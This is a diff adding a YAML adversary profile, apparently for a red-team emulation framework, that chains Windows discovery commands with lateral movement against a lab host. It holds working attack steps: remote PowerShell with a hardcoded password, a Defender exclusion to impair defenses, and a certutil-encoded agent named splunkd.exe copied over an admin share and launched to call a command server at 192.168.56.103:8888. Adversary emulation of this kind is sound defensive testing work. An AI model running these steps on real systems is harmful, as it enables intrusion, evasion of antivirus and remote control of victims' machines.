@@ -1,0 +1,106 @@
+id: 9ec57c68-f8e9-4147-ac77-4b8eb0e5c22b
+name: Lateral Movement Adversary
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- e06fb51c7690053f4bee3efd998a621b
+- f5b4c02bae169cb3a62ac26bb80321d6
+- 85341c8c-4ecb-4579-8f53-43e3e91d7617
+- b3ff8a77-f1ae-4208-8f73-40c67485aeaa
+- 20d013a2-5aee-4e7d-a6f6-8de35c3902d3
+- e85639e7-716a-45a2-8970-7204708240f7
+abilities:
+ e06fb51c7690053f4bee3efd998a621b:
+  name:  System Network Connections Discovery
+  tactic:  discovery
+  technique_name:  "System Network Connections Discovery"
+  technique_id:  T1049
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net use
+ f5b4c02bae169cb3a62ac26bb80321d6:
+  name:  Permission Groups Discovery PowerShell (Local)
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Local Groups"
+  technique_id:  T1069.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       get-localgroup; Get-LocalGroupMember -Name "Administrators"
+ 85341c8c-4ecb-4579-8f53-43e3e91d7617:
+  name:  Collect ARP details
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       arp -a
+   - sh:
+     platform: linux
+     command: |
+       arp -a
+   - psh:
+     platform: windows
+     command: |
+       arp -a
+   - cmd:
+     platform: windows
+     command: |
+       arp -a
+ b3ff8a77-f1ae-4208-8f73-40c67485aeaa:
+  name:  Remote Host Processes
+  tactic:  defense-evasion
+  technique_name:  "Remote Services: SMB/Windows Admin Shares"
+  technique_id:  T1021.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $Target = "192.168.56.105";
+       $User = "victima";
+       $Pass = "pass1" | ConvertTo-SecureString -AsPlainText -Force;
+       $Cred = New-Object System.Management.Automation.PSCredential($User, $Pass);
+       
+       Invoke-Command -ComputerName $Target -Credential $Cred -ScriptBlock {
+           Get-Process | Select-Object Id, ProcessName, Path;
+       }
+ 20d013a2-5aee-4e7d-a6f6-8de35c3902d3:
+  name:  Exclude Fold
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify Tools"
+  technique_id:  T1562.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $Target = "192.168.56.105";
+       $User = "victima";
+       $Pass = "pass1" | ConvertTo-SecureString -AsPlainText -Force;
+       $Cred = New-Object System.Management.Automation.PSCredential($User, $Pass);
+       
+       Invoke-Command -ComputerName $Target -Credential $Cred -ScriptBlock {
+           
+           Add-MpPreference -ExclusionPath "C:\Users\Public" -Force;
+           
+       }
+ e85639e7-716a-45a2-8970-7204708240f7:
+  name:  Lateral Movement Custom
+  tactic:  lateral-movement
+  technique_name:  "Lateral Tool Transfer"
+  technique_id:  T1570
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       certutil -encode C:\Users\Public\splunkd.exe C:\users\public\com.crt | Out-Null;
+       Copy-Item -Path "C:\users\public\com.crt" -Destination "\\192.168.56.105\C$\Users\Public\com.crt" -Force;
+       Invoke-Command -ComputerName 192.168.56.105 -ScriptBlock {
+           certutil -decode "C:\Users\Public\com.crt" "C:\Users\Public\splunkd.exe";
+           Invoke-WmiMethod -ComputerName . -Class Win32_Process -Name Create -ArgumentList "C:\users\public\splunkd.exe -server http://192.168.56.103:8888 -group red"
+       }
+       
